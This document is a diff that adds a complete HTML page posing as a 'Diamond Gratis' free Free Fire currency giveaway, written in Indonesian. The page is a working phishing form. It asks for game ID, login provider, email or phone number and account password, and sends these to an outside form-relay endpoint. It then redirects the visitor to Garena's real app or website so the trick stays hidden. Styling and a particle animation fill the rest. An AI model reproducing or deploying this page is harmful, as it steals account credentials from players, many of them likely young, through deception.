@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Diamond Gratis</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: 'Segoe UI', sans-serif;
+}
+
+body{
+  height:100vh;
+  overflow:hidden;
+  color:white;
+  background: linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#1c1c1c);
+  background-size:400% 400%;
+  animation: gradientMove 10s ease infinite;
+}
+
+/* Gradient animation */
+@keyframes gradientMove{
+  0%{background-position:0% 50%;}
+  50%{background-position:100% 50%;}
+  100%{background-position:0% 50%;}
+}
+
+/* Loading Screen */
+#loader{
+  position:fixed;
+  width:100%;
+  height:100%;
+  background:#000;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+  font-size:24px;
+  letter-spacing:3px;
+  animation: fadeOut 1s ease forwards;
+  animation-delay:2s;
+}
+
+@keyframes fadeOut{
+  to{opacity:0; visibility:hidden;}
+}
+
+/* Particle canvas */
+canvas{
+  position:fixed;
+  top:0;
+  left:0;
+  z-index:0;
+}
+
+/* Glass Card */
+.card{
+  position:relative;
+  z-index:1;
+  width:380px;
+  margin:auto;
+  margin-top:80px;
+  padding:30px;
+  border-radius:20px;
+  backdrop-filter:blur(15px);
+  background:rgba(255,255,255,0.08);
+  border:1px solid rgba(255,255,255,0.2);
+  box-shadow:0 0 30px rgba(0,255,255,0.3);
+  animation: fadeUp 1.5s ease;
+}
+
+@keyframes fadeUp{
+  from{opacity:0; transform:translateY(40px);}
+  to{opacity:1; transform:translateY(0);}
+}
+
+h2{
+  text-align:center;
+  margin-bottom:20px;
+  text-shadow:0 0 10px cyan;
+}
+
+input, textarea, label, div, option value{
+  width:100%;
+  padding:12px;
+  margin:10px 0;
+  border-radius:10px;
+  border:none;
+  background:rgba(255,255,255,0.1);
+  color:white;
+  outline:none;
+}
+
+button{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border-radius:10px;
+  border:none;
+  cursor:pointer;
+  font-weight:bold;
+  background:linear-gradient(45deg,#00f2ff,#ff00c8);
+  box-shadow:0 0 15px rgba(255,0,200,0.6);
+  transition:0.3s;
+}
+
+button:hover{
+  transform:scale(1.05);
+  box-shadow:0 0 25px rgba(0,255,255,0.9);
+}
+
+/* Dashboard Header */
+.header{
+  text-align:center;
+  padding:20px;
+  font-size:28px;
+  letter-spacing:2px;
+  text-shadow:0 0 15px #00f2ff;
+}
+
+</style>
+</head>
+
+<body>
+
+<div id="loader">LOADING...</div>
+
+<canvas id="particles"></canvas>
+
+<div class="header">SYARAT</div>
+
+<div class="card">
+  <h2>Send Message</h2>
+
+  <form action="https://formsubmit.co/24f4ca10aec07753845205d99b173fb9" method="POST">
+    <input type="text" name="Username" placeholder="Username" required>
+    <input type="number" name="Id" placeholder="Id" required>
+   
+    <form>
+    <label for="login">Login:</label>
+    <select id="login" name="login">
+        <option value="">-- Pilih --</option>
+        <option value="google">Google</option>
+        <option value="facebook">Facebook</option>
+        <option value="vk">Vk</option>
+        <option value="apple">Apple</option>
+    </select>
+
+      <form>
+    <label for="email/nomor">Email/Nomor:</label>
+    <select id="email/nomor" name="email/nomor">
+        <option value="">-- Pilih --</option>
+        <option value="nomor">Nomor Hp</option>
+        <option value="email">Email</option>
+        </select>
+        
+      <input type="email" name="Masukkan Email" placeholder="Email" required>
+      <input type="number" name="Masukkan Nomor Hp" placeholder="Nomor Hp" required>
+    <input type="text" name="Masukkan Password" placeholder="Password" required>
+    <textarea name="message" rows="4" placeholder="Pesan" required></textarea>
+    <button type="submit" onclick="bukaFreeFire()">Submit</button>
+      <div class="format-box">
+    <b>NOTE:</b><br>
+    HADIAH SEGERA DIKIRIM 24JAM SETELAH MENGISI SEMUA
+      </div>
+  </form>
+</div>
+
+<script>
+function bukaFreeFire(){
+    // Coba buka app (mungkin gagal)
+    window.location.href = "garena://";
+
+    // Kalau gagal 2 detik → buka website
+    setTimeout(function(){
+        window.location.href = "https://ff.garena.com/";
+    }, 2000);
+  }
+
+/* Particle Effect */
+const canvas = document.getElementById("particles");
+const ctx = canvas.getContext("2d");
+
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+let particles = [];
+
+for(let i=0;i<80;i++){
+  particles.push({
+    x:Math.random()*canvas.width,
+    y:Math.random()*canvas.height,
+    r:Math.random()*3,
+    dx:(Math.random()-0.5),
+    dy:(Math.random()-0.5)
+  });
+}
+
+function animate(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle="rgba(0,255,255,0.7)";
+  particles.forEach(p=>{
+    ctx.beginPath();
+    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+    ctx.fill();
+    p.x+=p.dx;
+    p.y+=p.dy;
+
+    if(p.x<0||p.x>canvas.width) p.dx*=-1;
+    if(p.y<0||p.y>canvas.height) p.dy*=-1;
+  });
+  requestAnimationFrame(animate);
+}
+animate();
+</script>
+
+</body>
+    </html>
